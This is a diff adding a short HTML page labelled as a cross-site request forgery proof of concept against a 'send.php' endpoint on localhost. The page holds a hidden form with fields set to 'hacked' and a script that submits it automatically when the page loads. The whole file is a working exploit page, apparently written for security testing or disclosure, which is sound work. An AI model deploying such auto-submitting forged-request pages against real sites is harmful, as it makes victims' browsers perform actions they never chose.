@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>CSRF PoC for send.php</title>
+</head>
+<body>
+  <h1>CSRF PoC for send.php</h1>
+  <form id="csrfForm" action="http://localhost/send.php" method="POST" style="display:none;">
+    <input type="hidden" name="agent" value="" />
+    <input type="hidden" name="title" value="hacked" />
+    <input type="hidden" name="message" value="hacked" />
+  </form>
+  <script>
+    document.getElementById('csrfForm').submit();
+  </script>
+</body>
+</html>
